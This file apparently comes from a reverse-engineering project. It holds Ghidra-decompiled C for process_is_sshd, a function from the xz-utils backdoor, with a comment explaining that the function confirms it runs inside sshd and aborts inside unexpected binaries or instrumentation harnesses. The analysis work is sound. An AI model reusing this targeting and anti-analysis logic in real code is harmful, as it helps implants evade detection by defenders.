// /home/kali/xzre-ghidra/xzregh/103A20_process_is_sshd.c
// Function: process_is_sshd @ 0x103A20
// Calling convention: unknown
// Prototype: undefined process_is_sshd(void)


/*
 * AutoDoc: Replays sshd's early argument parsing from the saved stack pointer: it verifies the argc/argv
 * tuple is sane, checks argv[0] hashes to '/usr/sbin/sshd', walks every argument through
 * `check_argument`, and then ensures envp pointers either live on the stack or inside the ELF
 * .data segment. Any environment string that maps to a known identifier (get_string_id != 0)
 * aborts the run, which keeps the loader from running inside unexpected binaries or
 * instrumentation harnesses.
 */
#include "xzre_types.h"


undefined8 process_is_sshd(undefined8 param_1,long *param_2)

{
  long lVar1;
  long *plVar2;
  int iVar3;
  long lVar4;
  long *plVar5;
  long lVar6;
  long lVar7;
  long *plVar8;
  ulong *envp;
  long argc;
  long argv0 [2];
  
  if (((((&stack0xfffffffffffffff8 < param_2) &&
        ((ulong)((long)param_2 - (long)&stack0xfffffffffffffff8) < 0x2001)) &&
       (lVar1 = *param_2, lVar1 - 1U < 0x20)) &&
      ((plVar8 = (long *)param_2[1], param_2 < plVar8 && (plVar8 != (long *)0x0)))) &&
     ((ulong)((long)plVar8 - (long)param_2) < 0x4001)) {
    iVar3 = get_string_id(plVar8,0);
    lVar6 = 1;
    if (iVar3 == 0x108) {
      while (lVar7 = lVar6 + 1, lVar6 != lVar1) {
        plVar8 = (long *)param_2[lVar7];
        if (plVar8 <= param_2) {
          return 0;
        }
        if (plVar8 == (long *)0x0) {
          return 0;
        }
        if (0x4000 < (ulong)((long)plVar8 - (long)param_2)) {
          return 0;
        }
        lVar4 = check_argument((short)*plVar8);
        lVar6 = lVar7;
        if (lVar4 != 0) {
          return 0;
        }
      }
      if (param_2[lVar7] == 0) {
        plVar8 = param_2 + lVar6 + 2;
        do {
          plVar2 = (long *)*plVar8;
          if (plVar2 == (long *)0x0) {
            return 0;
          }
          if ((plVar2 <= param_2) || (0x4000 < (ulong)((long)plVar2 - (long)param_2))) {
            argv0[0] = 0;
            plVar5 = (long *)elf_get_data_segment(param_1,argv0,1);
            if (plVar5 == (long *)0x0) {
              return 0;
            }
            if ((undefined2 *)(argv0[0] + (long)plVar5) < (undefined2 *)((long)plVar2 + 0x2cU)) {
              return 0;
            }
            if (plVar2 < plVar5) {
              return 0;
            }
          }
          iVar3 = get_string_id(*plVar8,0);
          if (iVar3 != 0) {
            return 0;
          }
          plVar8 = plVar8 + 1;
        } while (*plVar8 != 0);
        return 1;
      }
    }
  }
  return 0;
}

